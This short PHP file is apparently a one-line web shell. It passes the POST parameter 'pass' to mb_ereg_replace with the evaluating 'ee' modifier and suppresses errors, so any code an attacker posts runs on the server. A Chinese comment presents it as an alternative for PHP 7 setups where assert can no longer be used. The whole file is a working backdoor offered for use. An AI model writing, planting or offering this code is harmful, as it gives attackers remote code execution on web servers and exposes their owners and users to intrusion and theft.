<?php
//在php7不能使用assert时可使用 
@mb_ereg_replace('.*',$_POST['pass'],'','ee');
?>